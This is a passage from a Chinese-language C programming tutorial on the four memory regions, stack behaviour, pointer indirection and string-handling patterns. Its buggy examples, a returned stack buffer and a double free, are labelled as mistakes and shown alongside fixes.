src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A0%86%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A33.png" alt="此处输入图片的描述"></p><p><strong>2.栈区示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;char * getMem2()&#123;    char buf[64];//临时变量存放在栈区    strcpy(buf,&quot;abcdefgh&quot;);    return buf;&#125;int main() &#123;    char * tmp;    tmp = getMem2();    printf(&quot;%s&quot;,tmp);&#125;</code></pre><p><strong>这里的返回值是一个不确定的值，如果编译器有保护的话返回的是一个 null ，为什么呢？</strong></p><p>因为，我们将数据保存在了栈区这个临时区域，在子函数返回的时候这一块区域是会被编译器自动析构的，因此主函数中的tmp 得到的位置在那个时候已经没有了原始的数据，而是一块未知的内存区域。（偷个小懒，图我就不画了，有兴趣的读者可以自己尝试画一下，也加深一下对这个概念的理解）</p><p>**注意：**这里有一点需要强调的就是return buf 并不是将内存中的64个内存块全部返回出来，返回出来的是内存块的首地址。</p><h3 id="3-栈属性的理解"><a href="#3-栈属性的理解" class="headerlink" title="3.栈属性的理解"></a><strong>3.栈属性的理解</strong></h3><p>栈是从高地址向低地址增长的，我们平时画的只是一个示意图，其实可以开口向上也可以开口向下，完全取决于你自己，但是只要保证一点就是：后入栈的变量地址低就可以了。</p><p>我们用代码说话：</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int a = 1;    int b = 2;    printf(&quot;&amp;a:%d,&amp;b:%d&quot;,&amp;a,&amp;b);&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&amp;a:6422316,&amp;b:6422312</code></pre><p>可以很清楚的看到后入栈的b的地址要比先入栈的a 的地址低，和我们的理解完全符合</p><p><strong>强调一个容易忽略的点：</strong></p><p>我们刚刚只是单纯的变量，如果我们是数组呢？会有不一样吗？我们用代码说话</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int a = 1;    int b[2] =&#123;1,2&#125;;    printf(&quot;&amp;a:%d,&amp;b[0]:%d,&amp;b[1]:%d&quot;,&amp;a,&amp;b[0],&amp;b[1]);&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&amp;a:6422316,&amp;b[0]:6422308,&amp;b[1]:6422312</code></pre><p>我们惊奇的发现 b<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%85%E5%AD%98%E5%9B%9B%E5%8C%BA%E6%A8%A1%E5%9E%8B%E7%A4%BA%E6%84%8F%E5%9B%BE.png">1</a> 的地址要高于 b[0] ，这说明数组的生长方向和栈的生长方向是刚好反过来的，而且由于栈是静态编译的，所以在编译的时候变量所指的内存空间的标号就定下来了</p><h2 id="0X05-函数调用模型"><a href="#0X05-函数调用模型" class="headerlink" title="0X05 函数调用模型"></a><strong>0X05 函数调用模型</strong></h2><p>下面有一个gif 简单的说明了函数调用过程中栈区经历了哪些变化</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8.gif" alt="此处输入图片的描述"></p><blockquote><p>思考几个问题：</p><p><strong>1. main 函数分配的内存空间在子函数中能用吗？</strong></p><p>答案：可以的，因为main 函数在调用子函数的时候函数还没有运行完毕，那么内存空间就不会被析构，子函数当然可以使用</p><p><strong>2. 子函数中分配的内存能被主函数使用吗？</strong></p><p>答案：我们需要分情况讨论，如果是在栈上分配的内存，它是临时的内存空间，当子函数返回到主函数中以后就被析构了，因此不能使用，但是如果是在堆上或者静态存储区分配的内存空间由于不会被自动析构，因此能够被主函数中使用</p><p><strong>3. 一个主程序由n个子程序组成，那么C编译器会建立几个堆区和几个栈区？</strong></p><p>答案：一个，一个应用程序公用一个内存四区</p></blockquote><h2 id="0X06-指针铁律的强化"><a href="#0X06-指针铁律的强化" class="headerlink" title="0X06 指针铁律的强化"></a><strong>0X06 指针铁律的强化</strong></h2><h3 id="一、指针也是一种数据类型"><a href="#一、指针也是一种数据类型" class="headerlink" title="一、指针也是一种数据类型"></a><strong>一、指针也是一种数据类型</strong></h3><p><strong>1）指针也是一个变量，也需要占用内存空间，指针保存的是另一个变量的内存地址</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void* main(void) &#123;    int a =1;    int * p1 = (int *) 0XFFFFFFFF;    char****** p2 = (char ******) 0XFFFFFFFF;    printf(&quot;sizeof(a):%d,sizeof(p1):%d,sizeof(p2):%d\n&quot;,sizeof(a),sizeof(p1),sizeof(p2));&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">sizeof(a):4,sizeof(p1):4,sizeof(p2):4</code></pre><blockquote><p><strong>思考：为什么不同类型的指针的大小是一样的？</strong></p><p>答：我们知道指针代表的是<br>某块固定大小的内存的首地址，而地址是有地址编号的，地址编号是由CPU进行编址的，因此32位系统都是4字节，64位系统是8字节（当然其实并不只是和CPU的位数有关，还和操作系统和编译器的位数有关，总之是取它们三个的最小值）</p></blockquote><p>*<em>2）<em>p 是操作内存</em></em></p><p>①指针变量在声明的时候<em>表示我们现在声明的是指针变量<br>②指针变量在使用的时候</em>表示操作指针所指向内存空间中的值<br>③指针变量在初始化的时候表示将等号右边的地址赋值给该指针变量</p><p>*p 是通过地址找到内存（p的值），并操纵内存中的值</p><p>（1）*p 放在左边是操纵p指向内存中的值</p><pre><code class="hljs">a = 10;*p = NULL;p = &amp;a;*p = 20;//将a的值间接的改成20</code></pre><p>*<strong>p 就像一把钥匙，通过一个地址&amp;a 去改变a 所标识的内存空间的值</strong></p><p>（2）*p 放在右边是从内存中取值</p><pre><code class="hljs">c = 10;c = *p;</code></pre><p><strong>3）指针变量和它指向的内存块是两个不同的概念</strong></p><p><strong>含义一：</strong></p><p>给 p 赋值， p &#x3D; 0x1111; ，p+1 或者 p++ 只会改变指针变量的值而不会改变指针变量所指向的内容（也就是说只是让指针指向了另一块内存空间而已）</p><p><strong>含义二：</strong></p><p>给 *p 赋值 *p &#x3D; ‘a’; 不会改变指针变量的值，而是改变了指针指向的内存空间的值</p><p><strong>特别注意：当通过指针变量修改内存空间的值的时一定要保证内存空间能够被修改，如果不能修改就会出问题</strong></p><p><strong>示例程序：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;char* getString()&#123;    char* tmp = NULL;    tmp = &quot;abcdefgh&quot;;    return tmp;&#125;void* main(void) &#123;    char* p = getString();    *(p+2) = &#39;r&#39;;    printf(&quot;String:%s&quot;,p);&#125;</code></pre><p>这段代码会运行出错，因为字符串常量是存储在静态区的，静态区的数据时受操作系统保护的</p><p><strong>4）指针是一种数据类型，是指它指向的内存空间的数据类型</strong></p><p><strong>（1）如何看待下面的语句？</strong></p><pre><code class="hljs">int getASD1(char*p1);int getASD2(char**p2);int getASD2(char***p2);int getASD2(char (*p4)[30]);int getASD2(char (*p5)[10][30]);</code></pre><p>可能很多人看了会有这样的疑问，我们在使用指针作为函数的形参的时候究竟是把 char* 看成一个整体还是把 *p 看成一个整体呢？</p><p>其实我们思考问题的角度有问题，我们应该从编译器的角度去看这个问题，在编译器看来只要是带*号的就是指针，指针就是代表着地址的标号，在32位平台下就分配4个字节的空间，而当我们在使用指针指向的内存空间的时候才关心指针指向的内存空间是一维的还是二维的。</p><p><strong>（2）指针的步长是由其所指的内存空间的数据类型决定的</strong></p><pre><code class="hljs">char* p = NULL;*p =&#39;a&#39;;p++  =&gt;  (unsiged char)p +sizeof(&#39;a&#39;)</code></pre><h3 id="补充：野指针"><a href="#补充：野指针" class="headerlink" title="补充：野指针"></a><strong>补充：野指针</strong></h3><p>什么是野指针？<br>野指针就是指向未知内存区域的指针，在无意中操纵这种指针是非常危险的，会直接造成程序的崩溃，下面举一个野指针的例子：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    char* p = NULL;    p = (char*)malloc(100);    if(p == NULL)&#123;        return -1;    &#125;    strcpy(p, (const char *) &quot;xxxx&quot;);    printf(&quot;%s&quot;,p);    //第一次释放    if(NULL != p)&#123;        free(p);    &#125;    //重复释放    if(NULL != p)&#123;        free(p);    &#125;    return 0;&#125;</code></pre><p><strong>内存四区图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%87%8E%E6%8C%87%E9%92%88%E6%A8%A1%E5%9E%8B.png" alt="此处输入图片的描述"></p><p><strong>解释：</strong></p><p>我们要非常清楚一点，指针变量和内存区域是两个完全不同的概念，当时用free()函数销毁p指针指向的内存区域的时候，p指针的值并没有改变，还是原来的0xaa11 ,只不过是这个时候 0xaa11 已经不是我们当时malloc()分配的内存空间了，于是下次再进行判段 p是不是为 NULL的时候 P肯定不是 NULL，于是乎还会在 free一次，但是这一次我们也不知道free的是什么东西了，于是程序 就会崩溃， 这就是野指针的巨大危害。</p><p><strong>修改：</strong></p><p>我们只需要在每次free(）以后将 指针p的值归位就行了。</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    char* p = NULL;    p = (char*)malloc(100);    if(p == NULL)&#123;        return -1;    &#125;    strcpy(p, (const char *) &quot;xxxx&quot;);    printf(&quot;%s&quot;,p);    //第一次释放    if(NULL != p)&#123;        free(p);        p = NULL;    &#125;    //重复释放    if(NULL != p)&#123;        free(p);        p = NULL;    &#125;    return 0;&#125;    </code></pre><p><strong>总结：</strong></p><p>为了避免出现野指针的情况我们建议以下几点：<br>（1）定义指针的时候初始化成NULL<br>（2）释放指针所指的内存空间的时候将指针重新指向NULL</p><h3 id="二、间接赋值（p）是指针存在的最大意义"><a href="#二、间接赋值（p）是指针存在的最大意义" class="headerlink" title="*二、间接赋值（p）是指针存在的最大意义"></a>*<em>二、间接赋值（<em>p）是指针存在的最大意义</em></em></h3><p>这其实也是C语言指针的一个精髓所在，我们能在程序之间传递地址来操纵同一块内存空间</p><p><strong>（1）从0级指针到1级指针的技术推演过程</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int geta(int b)&#123;    b = 100;    return b;&#125;int getp(int* p)&#123;    *p = 1000;    return *p;&#125;void* main() &#123;    int a = 1;    a = geta(a);    printf(&quot;a:%d\n&quot;,a);    a = getp(&amp;a);    printf(&quot;a:%d\n&quot;,a);&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a:100a:1000</code></pre><p><strong>简单的解释：</strong></p><p>可能原来我们对此有些疑惑，但是我相信如果你对我之前画的内存四区图真的理解了的话，现在应该是非常清晰的的，b是在栈区新分配的一块内存空间，与main函数中的a 之间没有任何联系，于是无论你怎么修改 b 对a 来讲都是没有影响的，但是如果你传递的是a 的地址的话，通过地址间接地操控 a 变量成为可能。</p><p><strong>（2）从一级指针到二级指针的技术推演过程</strong></p><p>二级指针可以从一级指针类比而来，一级指针是普通变量的指针（地址），他可以通过对该地址取<em>间接地修改变量的内容，那么二级指针就是一级指针的指针（地址），他可以通过对该地址取</em>间接地修改一级指针的内容（一级指针指向的地址）</p><p><strong>示例代码1：</strong></p><pre><code class="hljs"> void* main() &#123;    char* p1 = NULL;    char** p2 = NULL;    //直接赋值    p1 = (char*)0X11;    p2 = (char**)0X22;        //间接赋值    p2 = &amp;p1;    *p2 = (char*)0X12;&#125;</code></pre><p><strong>示例代码2：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void* getp(char** p)&#123;    *p = (char*)0X0011;&#125; void* main() &#123;    char* p1 = NULL;    char** p2 = NULL;    //直接赋值    p1 = (char*)0X11;    p2 = (char**)0X22;        //间接赋值，传进去指针p1的地址    getp(&amp;p1);&#125;</code></pre><p><strong>再次强调一下，p1 和 p2 都是变量，一个是代表普通变量的地址编号，另一个代表指针变量的地址编号，一个通过<em>操纵普通变量的值，另一个通过</em>操纵指针变量的值</strong></p><p><strong>（3）总结一下间接赋值成立的三个条件：</strong></p><p>1）定义两个变量，一个实参一个形参<br>2）将实参取地址扔给形参，建立关联<br>3）通过形参取*修改实参的值</p><p><strong>（4）间接赋值的应用场景</strong></p><p><strong>场景一：</strong> 1 、2、3 都写在一个函数内<br><strong>场景二：</strong> 1、2 写在一个函数内 3 写在另一个函数内&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;》函数间传递指针<br><strong>场景三：</strong> 1 写在一个函数内，2、3 写在另一个函数内 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;》 C++ 中存在这种情况</p><p><strong>场景一示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    char buf1[128] = &quot;12312414nkj1b4jk1b232131&quot;;    char buf2[128] = &#123;0&#125;;    char* p1 = buf1;    char* p2 = buf2;    while(&#39;\0&#39; != *p1)&#123;        *p2 = *p1;        p1++;        p2++;    &#125;    printf(&quot;buf2:%s&quot;,buf2);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">buf2:12312414nkj1b4jk1b232131</code></pre><p><strong>注：其他的示例代码我就不写了，读者可以自己尝试完成（其实前面类似的都有了）</strong></p><p><strong>（5）间接赋值推论</strong></p><p>1）用1级指针（形参），间接的修改0级指针（实参）的值<br>2）用2级指针（形参），间接的修改1级指针（实参）的值<br>3）用3级指针（形参），间接的修改2级指针（实参）的值</p><p>以此类推……</p><h3 id="三、理解指针必须和内存四区相结合"><a href="#三、理解指针必须和内存四区相结合" class="headerlink" title="三、理解指针必须和内存四区相结合"></a><strong>三、理解指针必须和内存四区相结合</strong></h3><p><strong>指针的输入和输出特性</strong></p><p><strong>out ：</strong></p><p>在主函数中分配内存(栈&#x2F;malloc&#x2F;静态)，然后把地址甩出去给被调用函数，让他来操控这一块内存</p><p><strong>in：</strong></p><p>在被调用函数中分配内存（malloc&#x2F;静态），然后主函数接收被调用韩散户甩进来的内存地址，并进行操控</p><h3 id="四、应用指针必须和函数调用相结合"><a href="#四、应用指针必须和函数调用相结合" class="headerlink" title="四、应用指针必须和函数调用相结合"></a><strong>四、应用指针必须和函数调用相结合</strong></h3><p>图</p><h3 id="五、一级指针的典型用法"><a href="#五、一级指针的典型用法" class="headerlink" title="五、一级指针的典型用法"></a><strong>五、一级指针的典型用法</strong></h3><p><strong>（1）数组</strong></p><p>前面的内容我们已经涉及到这一部分，于是这里不再赘述（详情可见<strong>0X01 数组做函数参数的退化问题</strong>）</p><p><strong>（2）字符串</strong></p><blockquote><p><strong>注意：</strong></p><ol><li>C语言中字符串是以 \0结尾的</li><li>C语言中没有字符串类型，我们可以通过字符数组来模拟字符串</li><li>字符串的内存分配可以在堆、栈和静态区上（<strong>很重要</strong>）</li></ol></blockquote><p><strong>①字符串赋值的前两个方法：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    //1.指定长度    //如果长度给多了，那么编译器会在多余的空间自动补零    char buf[128] = &#123;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;&#125;;    //如果你的长度不够，就会报错    //char buftest[2] = &#123;&#39;a&#39;,&#39;v&#39;,&#39;c&#39;&#125;;    //2.不指定长度    char buf2[] = &#123;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;&#125;;    //但是这种形式并不是标准的C风格的字符串，因为没有以0结尾，只能说是一个6个字节的字符数组    return 0;&#125;</code></pre><p><strong>②字符串赋值的第三个方法：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int len = 0;    int size = 0;    char buf[] = &quot;abcdef&quot;;//这样赋值会把结尾的0赋值进去    len = strlen(buf);    size = sizeof(buf);    printf(&quot;字符串的长度为：%d,数组的数据类型的大小：%d&quot;,len,size);    return 0;&#125;</code></pre><p><strong>结果:</strong></p><pre><code class="hljs">字符串的长度为：6,数组的数据类型的大小：7</code></pre><p><strong>③通过数组下标和指针来操纵字符串</strong></p><p>上面已经有过实例了，我这里就不再演示</p><blockquote><p><strong>补充两个小问题：</strong></p></blockquote><blockquote><p>*<em>1.[] 和 <em>p 的关系</em></em></p><p>（1）他们的用法是类似的，只不过[] 更符合程序员的阅读习惯</p><p>buf[i] &#x3D;&#x3D;&gt; buf[0+i] &#x3D;&#x3D;&gt; *(buf+i)</p><p>（2）但是buf 和 *p 有着非常本质区别</p><p>buf 从他出现的第一次开始就是一个指针常量，他的值是能被改变的，但是 *p<br>却是一个指针变量，值可以随意改变，这个非常的重要，也是很多初学者一直要犯的错误。</p><p><strong>2.那么为什么设计编译器的人要把他设置成一个指针常量而不是变量呢？</strong></p><p>因为buf<br>这个数组是在栈区开辟的空间，当函数运行完毕的时候这一块空间将被析构，如果你改变了sbuf（这一块空间的首地址）那么到时候编译器就不知道该从哪里开始析构内存空间了。</p></blockquote><p><strong>④字符串一级指针的内存模型的建立</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    char buf[10] = &quot;abcdef&quot;;    char buf2[] = &quot;bbb&quot;;    char* p1 = &quot;11111&quot;;    char* p2 = malloc(100);    strcpy(p2,&quot;zxczxc&quot;);    return 0;&#125;</code></pre><p><strong>下面我用内存四区图的形式给大家展示一下（代码区我们暂时不考虑）</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%80%E7%BA%A7%E6%8C%87%E9%92%88%E7%9A%84%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B.png" alt="此处输入图片的描述"></p><p><strong>⑤字符串作为函数参数实现copy</strong></p><p>原来我们是这么写字符串的copy的</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    char buf[] = &quot;welcome to XDSEC&quot;;    char buf2[128];    int i =0;    for(i=0;*(buf+i) != &#39;\0&#39;;i++)&#123;        *(buf2+i) = *(buf+i);    &#125;    buf2[i] = &#39;\0&#39;;    printf(&quot;buf2:%s&quot;,buf2);    return 0;&#125;</code></pre><p><strong>注意一下:这里循环中并没有将\0 copy进去，最后一定要将\0单独的添加，否则就是一个bug代码</strong></p><p>但是现在我们要学会能使用自定义的接口，直接传入两个指针作为参数，间接的实现字符串的copy</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void* str_copy(char *from,char *to)&#123;    for(;&#39;\0&#39; != *from;from++,to++)&#123;        *to = *from;    &#125;    *to = &#39;\0&#39;;&#125;int main() &#123;    char buf[] = &quot;welcome to XDSEC&quot;;    char buf2[128];    str_copy(buf,buf2);    printf(&quot;buf2:%s&quot;,buf2);    return 0;&#125;</code></pre><p>这个代码写的有一些臃肿，我们可以进一步修改一下</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void* str_copy(char *from,char *to)&#123;    while(&#39;\0&#39; != *from)&#123;        *to++ = *from++;    &#125;    *to = &#39;\0&#39;;&#125;int main() &#123;    char buf[] = &quot;welcome to XDSEC&quot;;    char buf2[128];    str_copy(buf,buf2);    printf(&quot;buf2:%s&quot;,buf2);    return 0;&#125;</code></pre><p>这段代码能达到同样的效果，但这里面牵扯出一个问题</p><blockquote><p><code>*</code> 和 ++ 谁的优先级高：<br>答案是：++ 的优先级要高于 * 的优先级，但是由于这里是后++，必须先执行操作，再执行++ ,因此， *to++ &#x3D; *from++; 等同于 *to &#x3D; *from; from++; to++; </p></blockquote><p>但是现在遇到一个很棘手的问题，每次我们都必须单独的拷贝\0，这是非常蛋疼的，万一就忘了呢，你说是不是，于是我们必须对代码进行进一步改进。</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;    void* str_copy(char *from,char *to)&#123;    while((*to++ = *from++) !=&#39;\0&#39;);&#125;int main() &#123;    char buf[] = &quot;welcome to XDSEC&quot;;    char buf2[128];    str_copy(buf,buf2);    printf(&quot;buf2:%s&quot;,buf2);    return 0;&#125;</code></pre><p>这段代码在循环中进行了首先的copy，然后才判拷copy 的是不是 \0n ,是的话就退出循环，然而这个时候已经将\0 copy进去了，这其实也是 strcpy() 函数的源码实现的方案。</p><p><strong>再优化的话我们可以这样：</strong></p><pre><code class="hljs">void* str_copy(char *from,char *to)&#123;    while(*to++ = *from++);&#125;</code></pre><p>虽然功能实现了，但是这段代码并不够健壮，我们还需要解决几点问题：</p><blockquote><p><strong>问题一：</strong></p><p>如果我们在调用api函数的时候忘记了在主函数中分配内存怎么办？那我们传进去一个空的指针，往空的指针拷贝数据肯定是会出现程序崩溃的，于是我们需要对传入的指针进行非空的检测，如果为空那么直接返回。不进行拷贝操作。</p></blockquote><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int  str_copy(char *from,char *to)&#123;    if(from == NULL || to == NULL)&#123;        return -1;    &#125;    while((*to++ = *from++));    return 0;&#125;int main() &#123;    char buf[] = &quot;welcome to XDSEC&quot;;    char * buf2 = NULL;//注意，这里现在传入的是一个空指针    int res = 0;    res = str_copy(buf,buf2);    if(res != 0)&#123;        printf(&quot;str_copy function has some error, please check and try again!&quot;);        return -1;    &#125;    printf(&quot;buf2:%s&quot;,buf2);    return 0;&#125;</code></pre><p> <strong>结果：</strong></p><pre><code class="hljs">str_copy function has some error, please check and try again!</code></pre><blockquote><p><strong>问题二：</strong></p><p>我们现在在API函数中如果想打印这个字符串实际上是不可行的，因为我们直接操纵了形参的值，形参现在指向的位置已经是字符串的末尾了，于是乎，我们应当在API函数中创建一个临时指针变量去接收形参的值，然后改变的是临时的指针变量，使得形参依然指向字符串的一开始。</p></blockquote><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int  str_copy(char *from,char *to)&#123;    char* str_from = from;    char* str_to = to;    if(str_from == NULL || str_to == NULL)&#123;        return -1;    &#125;    while((*str_to++ = *str_from++));    return 0;&#125;int main() &#123;    char buf[] = &quot;welcome to XDSEC&quot;;    char buf2[128];    int res = 0;    res = str_copy(buf,buf2);    if(res != 0)&#123;        printf(&quot;str_copy function has some error, please check and try again!&quot;);        return -1;    &#125;    printf(&quot;buf2:%s&quot;,buf2);    return 0;&#125;</code></pre><h3 id="六、字符串指针的实际应用模型"><a href="#六、字符串指针的实际应用模型" class="headerlink" title="六、字符串指针的实际应用模型"></a><strong>六、字符串指针的实际应用模型</strong></h3><p>因为这一节太重要了，内容也非常的多，我就单独把它拿出来放在和众多铁律相同的地位来给大家演示</p><p><strong>（1）strstr while dowhile 模型</strong><br>利用这个模型求一个字符串在另一个字符串中出现的次数</p><p>strstr()  函数的作用是返回后一个参数在前一个参数中出现的位置（也就是返回的是一个指针）</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int count = 0;    char* p = &quot;1234abcdjnvvvsdabcdfmr234u9abcdfjjew&quot;;    do&#123;        p = strstr(p, (const char *) &quot;abcd&quot;);        if(p != NULL)&#123;            count++;            p = p + strlen((const char *) &quot;abcd&quot;);        &#125;else&#123;            break;        &#125;    &#125;while(*p != &#39;\0&#39;);    printf(&quot;一共出现了：%d次&quot;,count);    return 0;&#125;</code></pre><p>但是现在我们需要将该功能抽象成一个API接口，放在main函数外运行。</p><blockquote><p><strong>技巧点播：</strong><br>我们在创建API函数的时候绝对不要说API函数给返回一个值，然后main函数去接收，这样写说明你没有掌握C语言的精髓，C语言的精髓就是通过指针去操纵变量，于是我们应该用指针做函数参数将我们的运算结果甩出来，而不是傻傻的将API函数的运行结果以返回值的形式进行传递。</p></blockquote><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int  getCount(char* p,char* sub,int* count)&#123;    char* temp_p = p;    int res = 0;    if(p == NULL || sub == NULL || count == NULL)&#123;        res = -1;        printf(&quot;func getCount() err %d&quot;,res);         return res;    &#125;    do&#123;        temp_p = strstr(temp_p, sub);        if(temp_p != NULL)&#123;            *count = *count+1;            temp_p = temp_p + strlen(sub);        &#125;else&#123;            break;        &#125;    &#125;while(*temp_p != &#39;\0&#39;);    return res;&#125;int main() &#123;    int count = 0;    int res = 0;    char* p = &quot;1234abcdjnvvvsdabcdfmr234u9abcdfjjew&quot;;    char* sub = &quot;abcd&quot;;    res = getCount(p,sub,&amp;count);    if(res != 0)&#123;        printf(&quot;func getCount() err:%d \n&quot;,res);        return res;    &#125;    printf(&quot;一共出现了：%d次&quot;,count);    return 0;&#125;</code></pre><p><strong>这里面有几点我需要提示一下：</strong></p><p>（1）并不是说所有的指针形参都需要给一个临时的指针变量来接，如果这个参数传递进来并没有要改变 的需求，我们也不用浪费空间去创建临时指针变量。<br>（2）API函数应该有一个返回值，这个返回值我们一开始初始化为0， 在运行过程中我们进行一些判段，出现问题我们就直接返回（这样返回值就不是0），在主函数中我们接收这个返回值，然后进行判段，从而决定是否 返回0还是直接打印一个异常，并将异常返回。</p><p> <strong>（2）两头堵模型</strong></p><p>利用两头堵模型求字符串中去除两端空白的的字符串的长度</p><pre><code class="hljs">#include &quot;ctype.h&quot;#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    char* p = &quot;    zxczcz      &quot;;    int i = 0;    int j = strlen(p)-1;    int n = 0;    while(isspace(p[i]))&#123;        i++;    &#125;    while(isspace(p[j]))&#123;        j--;    &#125;    n = j-i+1;    printf(&quot;字符串的长度为：%d&quot;,n);    return 0;&#125;</code></pre><p>将该功能封装成一个接口</p><pre><code class="hljs">#include &quot;ctype.h&quot;#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int getCount(char* p,int* count)&#123;    char* temp_p = p;    int ncount = 0;    if(p == NULL|| count == NULL)&#123;        return -1;    &#125;    int i = 0;    int j = strlen(temp_p)-1;    while(isspace(temp_p[i]))&#123;        i++;    &#125;    while(isspace(temp_p[j]))&#123;        j--;    &#125;    ncount = j-i+1;    *count = ncount;    return 0;&#125;int main() &#123;    int count = 0;    int res = 0;    char* p = &quot;    zxczcz      &quot;;    res = getCount(p,&amp;count);    if(res != 0)&#123;        printf(&quot;func getCount has something wrong please check and try again&quot;);        return res;    &#125;    printf(&quot;字符串的长度为：%d&quot;,count);    return 0;&#125;</code></pre><p>进一步，如果我还要你去除字符串前后的空格呢？</p><pre><code class="hljs">#include &quot;ctype.h&quot;#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int getCount(char* p,int* count)&#123;    char* temp_p = p;    int ncount = 0;    if(p == NULL|| count == NULL)&#123;        return -1;    &#125;    int i = 0;    int j = strlen(temp_p)-1;    while(isspace(temp_p[i]))&#123;        i++;    &#125;    while(isspace(temp_p[j]))&#123;        j--;    &#125;    ncount = j-i+1;    *count = ncount;    return 0;&#125;int trimSpace(char* str,char* newstr)&#123;    char* temp_p = str;    int ncount = 0;    if(temp_p == NULL|| newstr == NULL)&#123;        return -1;    &#125;    int i = 0;    int j = strlen(temp_p)-1;    while(isspace(temp_p[i]))&#123;        i++;    &#125;    while(isspace(temp_p[j]))&#123;        j--;    &#125;    ncount = j-i+1;    strncpy(newstr,temp_p+i,ncount);    newstr[ncount] = &#39;\0&#39;;//这一步是非常重要的，请大家务必不要忘记    return 0;&#125;int main() &#123;    int count = 0;    int res = 0;    char* p = &quot;    zxczcz      &quot;;    char buf[1024] = &#123;0&#125;;    res = getCount(p,&amp;count);    if(res != 0)&#123;        printf(&quot;func getCount has something wrong please check and try again\n&quot;);        return res;    &#125;    printf(&quot;字符串的长度为：%d\n&quot;,count);    res = trimSpace(p,buf);    if(res != 0)&#123;        printf(&quot;func trimSpace() has something wrong please check and try again\n&quot;);        return res;    &#125;    printf(&quot;去除两端空格后的字符串为：%s\n&quot;,buf);    return 0;&#125;</code></pre><p>当然了，我们也可以直接往原始字符串所在空间进行拷贝，而不是新建一块内存空间（但是需要保证原始字符串所在的内存空间能够被修改，我们这个程序由于原始的字符串是存储在静态存储区的，因此这一块空间是只读的而不可写，因此这种方法在该案例中不能使用，但是如果原始字符串写在栈区，那么可读可写，就没有任何问题）</p><p><strong>综合三个函数的实现：</strong></p><pre><code class="hljs">#include &quot;ctype.h&quot;#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int getCount(char* p,int* count)&#123;    char* temp_p = p;    int ncount = 0;    if(p == NULL|| count == NULL)&#123;        return -1;    &#125;    int i = 0;    int j = strlen(temp_p)-1;    while(isspace(temp_p[i]))&#123;        i++;    &#125;    while(isspace(temp_p[j]))&#123;        j--;    &#125;    ncount = j-i+1;    *count = ncount;    return 0;&#125;int trimSpace(char* str,char* newstr)&#123;    char* temp_p = str;    int ncount = 0;    if(temp_p == NULL|| newstr == NULL)&#123;        return -1;    &#125;    int i = 0;    int j = strlen(temp_p)-1;    while(isspace(temp_p[i]))&#123;        i++;    &#125;    